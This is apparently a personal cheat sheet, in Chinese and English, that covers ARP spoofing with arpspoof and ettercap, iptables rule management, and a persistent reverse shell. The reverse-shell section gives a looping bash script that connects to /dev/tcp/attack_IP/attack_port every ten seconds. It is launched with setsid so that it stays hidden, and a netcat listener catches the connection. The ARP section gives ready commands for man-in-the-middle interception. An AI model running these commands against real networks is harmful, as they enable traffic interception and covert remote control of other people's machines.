# arp

## arpspoof
1. install
```shell
apt install dsniff
```
2. 开启IP转发
```shell
# Linux root user
echo 1 >/proc/sys/net/ipv4/ip_forward
```
3. 查看IP转发
```shell
sudo sysctl -a | grep forward
```

## ettercap
```shell
# arp spoof
sudo ettercap -T -M arp /192.168.31.1// /192.168.31.68//
#
sudo ettercap -T -M arp:remote /192.168.31.1// /192.168.31.68//
```
## others
* driftnet
* upx
* od

# iptables

> https://www.digitalocean.com/community/tutorials/how-to-list-and-delete-iptables-firewall-rules

## 显示规则
```shell
sudo iptables -vL # 显示iptables规则,--line-number可以显示规则编号,用于指定删除某条规则
```

## 删除一条规则
```shell
sudo iptables -D # 用于删除
sudo iptables -D INPUT # 删除所有INPUT规则
sudo iptables -D INPUT 1 # 删除INPUT下第一条规则,编号来自--line-number
```

## 删除所有iptables规则
```shell
#开放所有端口
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -F
#Oracle自带的Ubuntu镜像默认设置了Iptable规则，关闭它
apt-get purge netfilter-persistent
#删除配置文件后需要重启
rm -rf /etc/iptables && reboot
```

## 添加防火墙规则
```shell
iptables -A INPUT -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

## 其他
```shell
sudo iptables -Z # 用于清除规则上的数据统计
sudo iptables -Z INPUT # 删除所有INPUT规则上的数据统计
sudo iptables -Z INPUT 1 # 删除INPUT下第一条规则上的数据统计,编号来自--line-number
```

## 实战例子
```shell
# 禁止该IP对于22端口访问
sudo iptables -A INPUT -s 180.101.88.249 -p tcp --dport 22 -j DROP

# 只允许固定IP对22端口访问，这是规则链是什么意思就很明确了，先过第一条检查该IP，在走第二条规则
# 如果两条规则反过来就错了
sudo iptables -A INPUT -p tcp --dport 22 -s 允许的IP地址 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j DROP
```

# reverse shell

    启用tcp连接主机，每隔10秒连接一次。当主机开启监听就直接向靶机发送指令。
    主机不在连接中，靶机上也看不到tcp信息，但是能看到进程信息。
    所以要将启动的进程的父进程设置为init(1)，用setsid命令将程序执行启动
1. 在靶机上启动反向shell

    创建如下文件reverse_shell.sh
```shell
#!/bin/bash

while true;do bash -i 2>/dev/null &> /dev/tcp/attack_IP/attack_port 0>&1;sleep 10; done;
```
    启动该程序
```shell
setsid reverse_shell.sh
```

2. 在攻击机器上接收
```shell
nc -lvp attack_port
```